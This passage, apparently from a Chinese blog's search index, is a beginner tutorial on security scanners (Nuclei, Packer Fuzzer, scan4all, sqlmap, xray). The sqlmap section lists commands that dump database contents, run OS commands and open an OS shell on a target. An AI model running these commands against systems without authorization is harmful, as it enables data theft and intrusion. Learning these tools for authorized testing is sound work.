-exclude-templates string[]     要排除的模板或者模板目录</span><br><span class="line">   -it, -include-templates string[]     执行默认或配置中排除的模板</span><br><span class="line">   -s, -severity value[]                根据严重程度运行模板，可候选的值有：info,low,medium,high,critical   </span><br><span class="line">   -es, -exclude-severity value[]       根据严重程度排除模板，可候选的值有：info,low,medium,high,critical   </span><br><span class="line">   -a, -author string[]                 执行指定作者的模板</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">   -o, -output string                   输出发现的问题到文件</span><br><span class="line">   -silent                              只显示结果</span><br><span class="line">   -nc, -no-color                       禁用输出内容着色（ANSI转义码）</span><br><span class="line">   -json                                输出为jsonL（ines）</span><br><span class="line">   -irr, -include-rr                    在JSONL中输出对应的请求和相应（仅结果）</span><br><span class="line">   -nm, -no-meta                        不显示匹配的元数据</span><br><span class="line">   -nts, -no-timestamp                  不在输出中显示时间戳</span><br><span class="line">   -rdb, -report-db string              本地的Nuclei结果数据库（始终使用该数据库保存结果）       </span><br><span class="line">   -me, -markdown-export string         以markdown导出结果</span><br><span class="line">   -se, -sarif-export string            以SARIF导出结果</span><br><span class="line"></span><br><span class="line">配置：</span><br><span class="line">   -config string                       指定Nuclei的配置文件</span><br><span class="line">   -rc, -report-config string           指定Nuclei报告模板文件</span><br><span class="line">   -H, -header string[]                 指定报告中的标题：value格式</span><br><span class="line">   -V, -var value                       通过var=value指定var值</span><br><span class="line">   -r, -resolvers string                指定Nuclei的解析文件</span><br><span class="line">   -sr, -system-resolvers               当DNS错误时使用系统DNS</span><br><span class="line">   -passive                             启用被动扫描处理HTTP响应</span><br><span class="line">   -ev, env-vars                        在模板中使用环境变量</span><br><span class="line"></span><br><span class="line">交互：</span><br><span class="line">   -inserver, -ineractsh-server string  使用interactsh反连检测平台（默认为&quot;https://interact.sh&quot;）</span><br><span class="line">   -itoken, -interactsh-token string    指定反连检测平台的身份凭证</span><br><span class="line">   -interactions-cache-size int         指定保存在交互缓存中的请求数（默认：5000）</span><br><span class="line">   -interactions-eviction int           从缓存中删除请求前等待的时间（默认为60秒）</span><br><span class="line">   -interactions-poll-duration int      每个轮询前等待时间（默认为5秒）</span><br><span class="line">   -interactions-cooldown-period int    退出轮询前的等待时间（默认为5秒）</span><br><span class="line">   -ni, -no-interactsh                  禁用反连检测平台，同时排除基于反连检测的模板</span><br><span class="line"></span><br><span class="line">限速：</span><br><span class="line">   -r1, -rate-limit int                 每秒最大请求量（默认：150）</span><br><span class="line">   -rlm, -rate-limit-minute int         每分钟最大请求量</span><br><span class="line">   -bs, -bulk-size int                  每个模板最大并行检测数（默认：25）</span><br><span class="line">   -c, -concurrency int                 并行执行的最大模板数量（默认：25）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">优化：</span><br><span class="line">   -timeout int                         超时时间（默认为5秒）</span><br><span class="line">   -retries int                         重试次数（默认：1）</span><br><span class="line">   -mhe, -max-host-error int            某主机扫描失败次数，跳过该主机（默认：30）</span><br><span class="line">   -project                             使用项目文件夹避免多次发送同一请求</span><br><span class="line">   -project-path string                 设置特定的项目文件夹</span><br><span class="line">   -spm, -stop-at-first-path            得到一个结果后停止（或许会中断模板和工作流的逻辑）</span><br><span class="line">   -stream                              流模式 - 在不整理输入的情况下详细描述</span><br><span class="line"></span><br><span class="line">无界面浏览器：</span><br><span class="line">    -headless                           启用需要无界面浏览器的模板</span><br><span class="line">    -page-timeout int                   在无界面下超时秒数（默认：20）</span><br><span class="line">    -sb, -show-brower                   在无界面浏览器运行模板时，显示浏览器</span><br><span class="line">    -sc, -system-chrome                 不使用Nuclei自带的浏览器，使用本地浏览器</span><br><span class="line"></span><br><span class="line">调试：</span><br><span class="line">    -debug                              显示所有请求和响应</span><br><span class="line">    -debug-req                          显示所有请求</span><br><span class="line">    -debug-resp                         显示所有响应</span><br><span class="line">    -proxy, -proxy-url string           使用HTTP代理</span><br><span class="line">    -proxy-socks-url string             使用SOCK5代理</span><br><span class="line">    -tlog, -trace-log string            写入请求日志到文件</span><br><span class="line">    -version                            显示版本信息</span><br><span class="line">    -v, -verbose                        显示详细信息</span><br><span class="line">    -vv                                 显示额外的详细信息</span><br><span class="line">    -tv, -templates-version             显示已安装的模板版本</span><br><span class="line"></span><br><span class="line">升级：</span><br><span class="line">    -update                             更新Nuclei到最新版本</span><br><span class="line">    -ut, -update-templates              更新Nuclei模板到最新版</span><br><span class="line">    -ud, -update-directory string       覆盖安装模板</span><br><span class="line">    -duc, -disable-update-check         禁用更新</span><br><span class="line"></span><br><span class="line">统计：</span><br><span class="line">    -stats                              显示正在扫描的统计信息</span><br><span class="line">    -sj, -stats-json                    将统计信息以JSONL格式输出到文件</span><br><span class="line">    -si, -stats-inerval int             显示统计信息更新的间隔秒数（默认：5）</span><br><span class="line">    -m, -metrics                        显示Nuclei端口信息</span><br><span class="line">    -mp, -metrics-port int              更改Nuclei默认端口（默认：9092）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="Packer-Fuzzer"><a href="#Packer-Fuzzer" class="headerlink" title="Packer Fuzzer"></a>Packer Fuzzer</h2><p>一款针对Webpack等前端打包工具所构造的网站进行快速、高效安全检测的扫描工具</p>
-<h3 id="全部参数-1"><a href="#全部参数-1" class="headerlink" title="全部参数"></a>全部参数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-u（--url）</span><br><span class="line"></span><br><span class="line">要扫描的网站网址路径，为必填选项，例如：-u https://demo.poc-sir.com；</span><br><span class="line"></span><br><span class="line">-c（--cookie）</span><br><span class="line"></span><br><span class="line">附加cookies内容，可为空，若填写则将全局传入，例如：-c &quot;POC=666;SIR=233&quot;；</span><br><span class="line"></span><br><span class="line">-d（--head)</span><br><span class="line"></span><br><span class="line">附加HTTP头部内容，可为空，若填写则将全局传入，默认为Cache-Control:no-cache，例如：-d &quot;Token:3VHJ32HF0&quot;；</span><br><span class="line"></span><br><span class="line">-l（--lang）</span><br><span class="line"></span><br><span class="line">语言选项，当为空时自动选择系统对应语言选项，若无对应语言包则自动切换至英文界面。可供选择的语言包有：简体中文(zh)、法语(fr)、西班牙语(es)、英语(en)、日语(ja)，例如：-l zh；</span><br><span class="line"></span><br><span class="line">-t（--type）</span><br><span class="line"></span><br><span class="line">分为基础版和高级版，当为空时默认使用基础版。高级版将会对所有API进行重新扫描并模糊提取API对应的参数，并进行：SQL注入漏洞、水平越权漏洞、弱口令漏洞、任意文件上传漏洞的检测。可使用adv选项进入高级版，例如：-t adv；</span><br><span class="line"></span><br><span class="line">-p（--proxy）</span><br><span class="line"></span><br><span class="line">全局代理，可为空，若填写则全局使用代理IP，例如：-p https://hack.cool:8080；</span><br><span class="line"></span><br><span class="line">-j（--js）</span><br><span class="line"></span><br><span class="line">附加JS文件，可为空，当您认为还有其他JS文件需要本工具分析时，可使用此选项，例如：-j https://demo.poc-sir.com/js/index.js,https://demo.poc-sir.com/js/vue.js；</span><br><span class="line"></span><br><span class="line">-b（--base）</span><br><span class="line"></span><br><span class="line">指定API中间部分（例如某API为：https://demo.poc-sir.com/v1_api/login 时，则其basedir为：v1_api），可为空，当您认为本工具自动提取的basedir不准确时，可使用此选项，例如：-b v1_api；</span><br><span class="line"></span><br><span class="line">-r（--report）</span><br><span class="line"></span><br><span class="line">指定生成的报告格式，当为空时默认生成HTML和DOC格式的报告。可供选择的报告格式有：html、doc、pdf、txt，例如：-r html,pdf；</span><br><span class="line"></span><br><span class="line">-e（--ext）</span><br><span class="line"></span><br><span class="line">是否开启扩展插件选项，本工具支持用户自我编写插件并存入ext目录（如何编写请参考对应目录下demo.py文件）。默认为关闭状态，当用户使用on命令开启时，本工具将会自动执行对应目录下的插件，例如：-e on；</span><br><span class="line"></span><br><span class="line">-f（--flag）</span><br><span class="line"></span><br><span class="line">SSL连接安全选项，当为空时默认关闭状态，在此状态下将会阻止一切不安全的连接。若您希望忽略SSL安全状态，您可使用1命令开启，将会忽略一切证书错误，例如：-f 1；</span><br><span class="line"></span><br><span class="line">-s（--silent）</span><br><span class="line"></span><br><span class="line">静默选项，一旦开启则一切询问YES或NO的操作都将自动设置为YES，并且参数后的内容便是本次扫描报告的名称（自定义报告名），可用于无人值守、批量操作、插件调用等模式，例如：-s Scan_Task_777。</span><br><span class="line"></span><br><span class="line">--st（--sendtype）</span><br><span class="line"></span><br><span class="line">请求方式选项，目前本选项支持POST和GET参数，一旦开启则将会使用对应的请求方式扫描所有的API，若不开启将会通过HTTP状态码来进行智能请求。</span><br><span class="line"></span><br><span class="line">--ct（--contenttype）</span><br><span class="line"></span><br><span class="line">Content-Type选项，可通过此选项自定义扫描时的HTTP请求头中的Content-Type参数内容，若不开启将会通过HTTP状态码来进行智能请求。</span><br><span class="line"></span><br><span class="line">--pd（--postdata）</span><br><span class="line"></span><br><span class="line">POST内容选项，可通过此选项自定义扫描时的POST请求内容(所有的扫描都将会使用此内容，仅对POST场景有效)，若不开启将会通过HTTP状态码来进行智能请求。</span><br><span class="line"></span><br><span class="line">--ah（--apihost）</span><br><span class="line"></span><br><span class="line">Api域名选项，可通过此选项自定义扫描时所有的API请求域名，例如：api部分(从JS中提取到的API路径)为/v1/info，扫描的url(-u --url参数传入内容，扫描的网页)为http://exp.com/，当apihost参数传入https://pocsir.com:777/则此时的API为https://pocsir.com:777/v1/info而不是http://exp.com/v1/info，用于api与前端不同域名或服务器等场景。</span><br><span class="line"></span><br><span class="line">--fe（--fileext）</span><br><span class="line"></span><br><span class="line">Api扩展名选项，可通过此选项对所有API都添加特定的扩展名，以便应对在提取API时出现扩展名提取缺失的情况，例如：当提取到的API为https://pocsir.com:777/v1/info时，传入--fe .json则工具将会自动将API转化成https://pocsir.com:777/v1/info.json进行扫描及检测。</span><br></pre></td></tr></table></figure>
-
-<h2 id="scan4all"><a href="#scan4all" class="headerlink" title="scan4all"></a>scan4all</h2><p>集成 vscan、nuclei、ksubdomain、subfinder等，充分自动化、智能化 并对这些集成的项目进行代码级别优化、参数优化，个别模块,如 vscan filefuzz部分进行了重写</p>
-<h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><p>对 127.0.0.1 进行http常用端口扫描，扫描完端口后对端口地址进行检测</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<p>直接对端口地址测试</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host http://127.0.0.1:7001</span><br></pre></td></tr></table></figure>
-
-<p>对 192.168.1.1&#x2F;24 C段进行端口扫描，扫描完端口后对端口地址进行检测</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host 192.168.1.1/24</span><br></pre></td></tr></table></figure>
-
-<p>对 ips.txt 内的 ip&#x2F;域名&#x2F;c段&#x2F;url地址 进行逐行检测(如果有url地址，则不会进行端口扫描)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -l ips.txt</span><br></pre></td></tr></table></figure>
-
-<p>对 127.0.0.1 的7001,7002端口进行检测</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host 127.0.0.1 -p 7001,7002</span><br></pre></td></tr></table></figure>
-
-<p>对 127.0.0.1 进行 NmapTop1000 端口进行检测 (不使用此参数，默认进行http常用端口扫描)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host 127.0.0.1 -top-Ports 1000</span><br><span class="line">scan4all -host 127.0.0.1 -top-Ports http</span><br></pre></td></tr></table></figure>
-
-<p>使用dnslog</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host 127.0.0.1 -ceyeapi xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx -ceyedomain xxxxxx.ceye.io</span><br></pre></td></tr></table></figure>
-
-<p>导出到文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host 127.0.0.1 -json -o 1.json</span><br><span class="line">scan4all -host 127.0.0.1 -csv -o 1.csv</span><br></pre></td></tr></table></figure>
-
-<p>只扫描端口和指纹不检测poc</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host 127.0.0.1 -np</span><br></pre></td></tr></table></figure>
-
-<p>设置扫描线程和速率&amp;#x20;</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scan4all -host 127.0.0.1 -c 25 -rate 1000</span><br></pre></td></tr></table></figure>
-
-<p>设置代理</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-proxy socks5://127.0.0.1:1080</span><br></pre></td></tr></table></figure>
-
-<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>SQL注入检测工具</p>
-<h3 id="常用参数-1"><a href="#常用参数-1" class="headerlink" title="常用参数"></a>常用参数</h3><p>判断注入是否存在</p>
-<p>sqlmap.py -u “<a href="http://www.xxx.com/user.jsp?id=1">www.xxx.com/user.jsp?id=1</a>“<br></p>
-<p>直接加载数据包测试</p>
-<p>sqlmap.py -r head.txt –dbs  &#x2F;&#x2F;head.txt 内容为 HTTP 请求<br></p>
-<p>获取数据库</p>
-<p>sqlmap.py -u “<a href="http://www.xxx.com/user.jsp?id=1">www.xxx.com/user.jsp?id=1</a>“ –dbs<br></p>
-<p>查看当前应用程序所用数据库</p>
-<p>sqlmap.py -u “<a href="http://www.xxx.com/user.jsp?id=1">www.xxx.com/user.jsp?id=1</a>“ –current-db<br></p>
-<p>列出指定数据库的所有表</p>
-<p>sqlmap.py -u “<a href="http://www.xxx.com/user.jsp?id=1">www.xxx.com/user.jsp?id=1</a>“ –table -D “数据库”</p>
-<p>读取指定表中的字段名称</p>
-<p>sqlmap.py -u “<a href="http://www.xxx.com/user.jsp?id=1">www.xxx.com/user.jsp?id=1</a>“ –columns -T “数据表” -D “数据库”</p>
-<p>读取指定字段内容</p>
-<p>sqlmap.py -u “<a href="http://www.xxx.com/user.jspid=1">www.xxx.com/user.jspid=1</a>“ –dump -C”字段” -T “数据表” -D “数据库”</p>
-<p>执行Shell命令</p>
-<p>sqlmap.py -u “URL” –os-cmd&#x3D;”net user”  &#x2F;&#x2F;执行 net user 命令</p>
-<p>sqlmap.py -u “URL” –os-shell  &#x2F;&#x2F;系统交互的shell</p>
-<p>POST提交方式</p>
-<p>sqlmap.py -u “URL” –data “POST参数”</p>
-<p>显示详细的等级</p>
-<p>sqlmap.py -u “URL” –dbs -v 1</p>
-<p>-v 参数包含以下7个等级。</p>
-<p>·0：只显示Python的回溯、错误和关键消息；</p>
-<p>·1：显示信息和警告信息；</p>
-<p>·2：显示调试信息；</p>
-<p>·3：有效载荷注入；</p>
-<p>·4：显示HTTP请求；</p>
-<p>·5：显示HTTP响应头；</p>
-<p>·6：显示HTTP响应页面的内容。</p>
-<p>注入等级</p>
-<p>sqlmap.py -u “URL” –level 3</p>
-<p><br>将注入语句插入到指定位置（常用于伪静态注入）</p>
-<p>sqlmap.py -u “<a href="http://www.xxx.com/id/2//*.html">http://www.xxx.com/id/2\\*.html</a>“ –dbs</p>
-<p>使用 Sqlmap 插件</p>
-<p>sqlmap.py -u “URL” –tamper “space2morehash.py”</p>
-<h2 id="TscanPlus"><a href="#TscanPlus" class="headerlink" title="TscanPlus"></a>TscanPlus</h2><p>一款综合性网络安全检测和运维工具，旨在快速资产发现、识别、检测，构建基础资产信息库，协助甲方安全团队或者安全运维人员有效侦察和检索资产，发现存在的薄弱点和攻击面。</p>
-<figure><img src="https://2843206953-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuQdEIFRPpmirHXN97b5y%2Fuploads%2Fvvwwpaj2jg7PsiZMyzg6%2Fimage.png?alt=media&#x26;token=3984e4e2-e6e0-4dcd-82a4-ec55d3df11ca" alt=""><figcaption></figcaption></figure>
-
-<h2 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h2><p>一款长亭自研的完善的安全评估工具，支持常见 web 安全问题扫描和自定义 poc | 使用之前务必先阅读文档</p>
-<p>使用基础爬虫爬取并对爬虫爬取的链接进行漏洞扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xray webscan --basic-crawler http://example.com --html-output vuln.html</span><br></pre></td></tr></table></figure>
-
-<p>使用 HTTP 代理进行被动扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xray webscan --listen 127.0.0.1:7777 --html-output proxy.html</span><br></pre></td></tr></table></figure>
-
-<p>设置浏览器 http 代理为 <code>http://127.0.0.1:7777</code>，就可以自动分析代理流量并扫描。</p>
-<p>只扫描单个 url，不使用爬虫</p>
-<p>xray webscan –url <a href="http://example.com/?a=b">http://example.com/?a=b</a> –html-output single-url.html</p>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>网络安全</tag>
-        <tag>新手教程</tag>
       </tags>
   </entry>
 </search>
